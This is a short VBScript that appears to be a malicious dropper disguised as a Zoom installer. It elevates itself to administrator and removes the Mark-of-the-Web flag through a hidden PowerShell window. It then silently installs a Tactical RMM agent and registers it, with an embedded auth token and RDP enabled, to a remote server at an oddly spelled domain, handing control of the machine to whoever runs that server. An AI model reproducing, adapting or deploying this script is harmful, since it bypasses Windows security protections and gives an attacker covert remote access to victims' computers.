If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

Dim strFolder
strFolder = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)

Dim oShell
Set oShell = CreateObject("WScript.Shell")

' Remove Mark-of-the-Web from installer
oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Unblock-File -Path '" & strFolder & "\ZoomInstaller.exe'""", 0, True

' Step 1: Install base agent silently
oShell.Run """" & strFolder & "\ZoomInstaller.exe"" /VERYSILENT /SUPPRESSMSGBOXES", 0, True

' Step 2: Wait for files to settle
WScript.Sleep 6000

' Step 3: Register with server silently
oShell.Run """C:\Program Files\TacticalAgent\tacticalrmm.exe"" -m install --api https://api.cacgreatchallange.org --client-id 1 --site-id 1 --agent-type workstation --auth e88d652cb5e09ed94a4572bbe3ec29b4c0046d0c4ce67e9ae4712faaa8bf3e53 --rdp --ping", 0, True